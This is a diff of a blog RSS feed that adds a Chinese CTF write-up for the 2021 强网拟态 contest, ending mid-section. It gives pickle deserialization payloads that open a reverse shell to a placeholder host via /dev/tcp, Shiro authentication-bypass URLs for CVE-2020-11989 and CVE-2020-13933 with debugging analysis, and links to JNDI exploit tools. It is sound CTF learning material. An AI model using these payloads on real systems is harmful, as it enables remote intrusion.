@@ -1,4 +1,288 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 22 Oct 2021 11:54:15 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Oct 2021 20:17:24 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>2021强网拟态 Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
+&lt;p>web有3个都是有了包浆的原题……还有一点脑洞题，反正奇奇怪怪的&lt;/p>
+&lt;p>属于是被师傅们带飞了，所以详细的wp还是自己写一写，认真地复现一下&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="zerocalc">zerocalc&lt;/h2>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024031549328.png" alt="image-20211024031549328">&lt;/p>
+&lt;p>emmmmmm 说实话一开始没有出 因为没悟出来它这是个什么逻辑2333333&lt;/p>
+&lt;h2 id="ezpickle">ezPickle&lt;/h2>
+&lt;pre tabindex="0">&lt;code># 用pker.py生成payload
+notadmin=GLOBAL('config','notadmin')
+notadmin[&amp;quot;admin&amp;quot;]=&amp;quot;yes&amp;quot;
+exec=GLOBAL('config','backdoor')
+payload='''__import__('subprocess').call(\&amp;quot;echo -e '#!/bin/bash\\nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1'&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x\&amp;quot;,shell=True)'''
+exec(payload)
+return
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">subprocess&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">).call(&amp;#34;echo -e &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&amp;#34;,shell=True)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxx&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023215957693.png" alt="image-20211023215957693">&lt;/p>
+&lt;p>没什么好说的，基础的pickle题，是2021巅峰极客what_pickle的阉割版（构造的思路几乎一样 但是简单很多），几乎一样的题目还有 [SUCTF 2019]Guess Game&lt;/p>
+&lt;p>限制的点在于&lt;u>&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/#--%E4%BB%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%85%A5%E9%A2%98%E7%9B%AE%E4%B8%AD%E8%87%AA%E8%AE%BE%E7%9A%84%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%9D%97%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89__%E7%AC%A6">只允许引入题目自设模块&amp;amp;限制模块中含下划线&lt;/a>&lt;/u>，那就直接变量覆盖，然后利用给出的&lt;code>eval()&lt;/code>弹shell就好了&lt;/p>
+&lt;p>————另外这里的payload也可以是简短版本的弹sehll的payload 不唯一嘛&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个需要注意的点是由于这里的反序列化入口是get传参，所以遇到+号会出问题，传进去之前要先urlencode(encode all special chars)&lt;/p>
+&lt;p>————顺带练个手，搓一个不含&lt;code>b'R'&lt;/code>的opcode（用&lt;code>b'o'&lt;/code>代替）&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0(g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">o.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>传参的时候记得再urlencode一下~~~&lt;/p>
+&lt;p>————之前我的&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/">总结笔记&lt;/a>已经相当全面了 &lt;del>可以出CTF教科书了233333&lt;/del>&lt;/p>
+&lt;h2 id="jack-shiro">Jack-Shiro&lt;/h2>
+&lt;p>属于是原题了属于是属于是属于是烤烂了已经，参见 &lt;a href="https://www.zhaoj.in/read-6859.html#WEB1_javaweb">[红明谷CTF 2021] JavaWeb&lt;/a> | &lt;a href="https://www.huamang.xyz/index.php/archives/99/">[天翼杯 2021] jackson&lt;/a> | &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">[NPUCTF2020] EzShiro&lt;/a>&lt;del>（虽然我自己根本没发现 实在是做过的题太少了 java更是不会 我的&lt;/del>&lt;/p>
+&lt;p>/login下有个登录，回显/json，返回的cookie有个rememberMe=deleteMe，可以知道是shiro&lt;/p>
+&lt;p>访问/json，后面会带一堆get请求的参数，用/;/json绕过（cve-2020-11989）&lt;/p>
+&lt;p>上工具&lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">JNDI-Injection-Exploit&lt;/a>一把梭（问题出在我vps上没有java环境 端口转发又处了亿点点问题…… 所以没有带出来flag），是cve-2020-36188&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024041750586.png" alt="image-20211024041750586">&lt;/p>
+&lt;p>哭哭&lt;/p>
+&lt;p>还有个工具是 &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a>，差不多的；下面是跟一跟涉及到的几个链子&lt;/p>
+&lt;h3 id="cve-2020-11989">CVE-2020-11989&lt;/h3>
+&lt;p>参考：&lt;a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)&lt;/a> | &lt;a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)&lt;/a>&lt;/p>
+&lt;p>Apache Shiro是一个常用的java安全框架，在1.5.3之前版本中当Shiro与Spring动态控制器一起使用时（Spring框架中只用Shiro鉴权），如果直接访问/shiro/admin/page会302跳转要求登录，而访问/;shiro/admin/page即可绕过权限验证，访问/admin的信息&lt;/p>
+&lt;h4 id="本地环境搭建复现">本地环境搭建&amp;amp;复现&lt;/h4>
+&lt;p>有带佬直接写好的docker可以直接pull拿来用&lt;/p>
+&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-11989
+docker run -p 8426:8080 &amp;lt;image&amp;gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar'
+docker pull jackey0/cve-2020-13933
+// docker start &amp;lt;container-id&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>或者下载&lt;a href="https://github.com/l3yx/springboot-shiro">l3yx/springboot-shiro&lt;/a>项目到本地编译为war包（或者也有编译好的&lt;a href="https://github.com/backlion/demo/blob/master/shiro.war">shiro.war&lt;/a>）之后手动放入tomcat下的webapps目录下运行。显然docker太香了！！！！！&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224051899.png" alt="image-20211025224051899">&lt;/p>
+&lt;p>访问映射到外部的8426端口，环境搭建完毕&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224115269.png" alt="image-20211025224115269">&lt;/p>
+&lt;p>post方式请求/doLogin页面，看到cookie中含rememberMe=deleteMe，确定为shiro&lt;/p>
+&lt;p>访问/admin/page页面，302重定向至/login页面要求登录&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232735464.png" alt="image-20211025232735464">&lt;/p>
+&lt;p>访问/;/admin/page页面，绕过鉴权，回显admin page&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232717422.png" alt="image-20211025232717422">&lt;/p>
+&lt;h4 id="源码分析动调">源码分析&amp;amp;动调&lt;/h4>
+&lt;p>先把jar包下载到在本地，导入idea&lt;/p>
+&lt;pre tabindex="0">&lt;code>docker cp &amp;lt;container-id&amp;gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/
+&lt;/code>&lt;/pre>&lt;p>使用idea远程对docker中部署的springboot项目进行debug&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026033544920.png" alt="image-20211026033544920">&lt;/p>
+&lt;pre tabindex="0">&lt;code>docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
+&lt;/code>&lt;/pre>&lt;p>Shiro的权限校验是通过判断url的匹配来进行的，如果Shiro获取的url和web框架处理的url结果不一致时就造成了权限绕过；Shiro对于url的获取和匹配在&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>中进行。&lt;/p>
+&lt;p>以访问/;/admin/page为例，通过它的&lt;code>getPathWithinApplication()&lt;/code>得到的requestURI=&amp;quot;/&amp;quot;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026105323534.png" alt="image-20211026105323534">&lt;/p>
+&lt;p>跟入此函数的处理逻辑&lt;code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication&lt;/code>，进入&lt;code>getRequestUri()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026113806371.png" alt="image-20211026113806371">&lt;/p>
+&lt;p>我们可以看到在中间过程中uri=&amp;quot;/;/admin/page&amp;quot;，但是从上面我们可以知道经过&lt;code>normalize(decodeCleanUriString())&lt;/code>处理过后返回的requestRUI=&amp;quot;/&amp;quot;，跟入这个函数，它先是调用&lt;code>decodeRequestSrting()&lt;/code>，没有对结果产生什么影响，&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026114857281.png" alt="image-20211026114857281">&lt;/p>
+&lt;p>而返回时的&lt;code>normalize()&lt;/code>会根据&amp;quot;;&amp;ldquo;进行url的截断处理，最终返回&amp;rdquo;/&amp;quot;&lt;/p>
+&lt;p>回到开头的/;/admin/page请求，spring中处理url的函数在&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115653673.png" alt="image-20211026115653673">&lt;/p>
+&lt;p>它调用的是springframework中自己&lt;code>getPathWithinApplication()&lt;/code>，经过一番骚操作返回的是/admin/page&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115916664.png" alt="image-20211026115916664">&lt;/p>
+&lt;p>跟入&lt;code>getPathWitinApplication()&lt;/code>，先是调用&lt;code>getContextPath()&lt;/code>，返回&amp;quot;/&amp;quot;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026120922475.png" alt="image-20211026120922475">&lt;/p>
+&lt;p>然后是&lt;code>getRequestUri()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121402778.png" alt="image-20211026121402778">&lt;/p>
+&lt;p>同样，在最终return之前的uri=&amp;quot;/;/admin/page&amp;quot;，经过了一个&lt;code>decodeAndCleanUriString()&lt;/code>，根据ch=59也就是&amp;quot;;&amp;ldquo;符进行一个分割，使用&lt;code>removeSemicolonContentInternal()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121749767.png" alt="image-20211026121749767">&lt;/p>
+&lt;p>于是&amp;rdquo;;&amp;ldquo;就不见了&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122016422.png" alt="image-20211026122016422">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122121074.png" alt="image-20211026122121074">&lt;/p>
+&lt;p>然后返回&amp;rdquo;/admin/page&amp;quot;给&lt;code>getPathWithinApplication()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122204403.png" alt="image-20211026122204403">&lt;/p>
+&lt;p>再传递给&lt;code>getPathWithinServletMapping()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122355835.png" alt="image-20211026122355835">&lt;/p>
+&lt;p>最终我们访问到的页面就是&amp;quot;/admin/page&amp;quot;了&lt;/p>
+&lt;p>————总结一下就是当url在shiro和spring中的处理不一致，当进入应用时被认作是访问&amp;quot;/;/admin/page&amp;quot;，不属于我们最初配置的&amp;quot;/admin/*&amp;ldquo;权限路由，而进入shiro后却被截断处理，认作是&amp;rdquo;/admin/page&amp;quot;，属于权限路由中，最终做到权限绕过&lt;/p>
+&lt;h3 id="cve-2020-13933">CVE-2020-13933&lt;/h3>
+&lt;p>由于11989的修补并不完全，导致又又又被绕过产生了13933……&lt;/p>
+&lt;h4 id="本地环境搭建复现-1">本地环境搭建&amp;amp;复现&lt;/h4>
+&lt;p>参考：&lt;a href="https://www.anquanke.com/post/id/214964#h2-3">shiro &amp;lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)&lt;/a>&lt;/p>
+&lt;p>还是采用docker形式复现（我爱docker）这里直接就是远程调试的启动命令啦，跟上面的一样配置就好了（&lt;/p>
+&lt;pre tabindex="0">&lt;code>docker pull jackey0/cve-2020-13933
+docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar'
+&lt;/code>&lt;/pre>&lt;p>访问/admin，报错页面且无302跳转；访问/login跳转到身份验证页面；访问/admin/%3bpage，无身份验证且返回admin page&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026171901636.png" alt="image-20211026171901636">&lt;/p>
+&lt;h4 id="原理分析动调">原理分析&amp;amp;动调&lt;/h4>
+&lt;p>还是导入jar包至idea，远程debug&lt;/p>
+&lt;p>直接看看shiro1.6.0的补丁补到了什么地方，在github上查看&lt;a href="https://github.com/apache/shiro/compare/shiro-root-1.5.3...shiro-root-1.6.0">diff&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026175139677.png" alt="image-20211026175139677">&lt;/p>
+&lt;p>增加了&lt;code>InvalidRequestFilter&lt;/code>类，有个&lt;code>isAccessAllowed()&lt;/code>函数，在全局上对分号、反斜杠、非ASCII码字符进行了过滤&lt;/p>
+&lt;p>以访问/admin/%3bpage为例，url先由shiro解析，还是&lt;code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain&lt;/code>，依旧是调用&lt;code>getPathWithinApplication()&lt;/code>，执行后requestURI=&amp;quot;/admin/&amp;quot;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181015088.png" alt="image-20211026181015088">&lt;/p>
+&lt;p>而之后进入springboot处理时，却变成了&amp;quot;/admin/;page&amp;quot;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181252374.png" alt="image-20211026181252374">&lt;/p>
+&lt;p>再回到最初跟一下具体的调用链&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182540363.png" alt="image-20211026182540363">&lt;/p>
+&lt;p>在&lt;code>removeSemicolon()&lt;/code>处理前，uri=&amp;quot;/admin/;page&amp;quot;（经&lt;code>decodeAndUriString()&lt;/code>解码了）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182711164.png" alt="image-20211026182711164">&lt;/p>
+&lt;p>处理后path=&amp;quot;/admin&amp;quot;，接着调用&lt;code>normalize()&lt;/code>函数变成&amp;quot;/admin&amp;quot;，传递给最初的&lt;code>getChain()&lt;/code>中的requestURI参数&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183041350.png" alt="image-20211026183041350">&lt;/p>
+&lt;p>之后被spring处理&lt;code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping&lt;/code>，其中会调用&lt;code>getRequestUri()&lt;/code>，它会再次调用&lt;code>decodeAndCleanUriString()&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183542060.png" alt="image-20211026183542060">&lt;/p>
+&lt;p>先&lt;code>removeSemicolonContent()&lt;/code>再&lt;code>decodeRequestString()&lt;/code>，那显然是怎么都去不掉&amp;quot;;&amp;ldquo;了，将&amp;rdquo;;page&amp;quot;看作一个整体&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026184529505.png" alt="image-20211026184529505">&lt;/p>
+&lt;p>我们回过头去看这次的权限设置是怎么匹配url的，定位到&lt;code>org.syclover.srpingbootshiro.LoginController&lt;/code>和&lt;code>org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190414964.png" alt="image-20211026190414964">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190401468.png" alt="image-20211026190401468">&lt;/p>
+&lt;p>可以看到，对于&amp;quot;/admin/*&amp;ldquo;需要鉴权，&amp;quot;/admin/{name}&amp;ldquo;返回admin page，而对于&amp;rdquo;/admin/&amp;ldquo;却没有设置权限&lt;/p>
+&lt;p>从上面的调试中我们知道shiro得到的是&amp;rdquo;/admin/&amp;quot;（先decode再去除&amp;rdquo;;&amp;quot;），被认作可以访问；而spring得到的是&amp;quot;/admin/;page&amp;quot;）先去除&amp;quot;;&amp;ldquo;再decode），与&amp;rdquo;/admin/{name}&amp;ldquo;的样式匹配，最后返回admin page~~（简直太完美了也~~&lt;/p>
+&lt;h4 id="临时修复">*临时修复&lt;/h4>
+&lt;p>（本地暂时还未复现&lt;/p>
+&lt;pre tabindex="0">&lt;code>map.put(&amp;quot;/admin/**&amp;quot;, &amp;quot;authc&amp;quot;);
+@GetMapping({&amp;quot;/admin/page&amp;quot;})
+public String admin() {
+return &amp;quot;admin page&amp;quot;;
+}
+&lt;/code>&lt;/pre>&lt;h3 id="cve-2020-36188">***CVE-2020-36188&lt;/h3>
+&lt;p>&lt;code>ch.qos.logback.core.db.JNDIConnectionSource&lt;/code>&lt;/p>
+&lt;p>可以参考 &lt;a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro&lt;/a>，工具 &lt;a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi&lt;/a> | &lt;a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit&lt;/a>&lt;/p>
+&lt;p>————由于我的java水平实在够呛，这里暂时先空着，等我学一学java 之后必定回来鞭尸&lt;/p>
+&lt;h2 id="easyfilter">EasyFilter&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
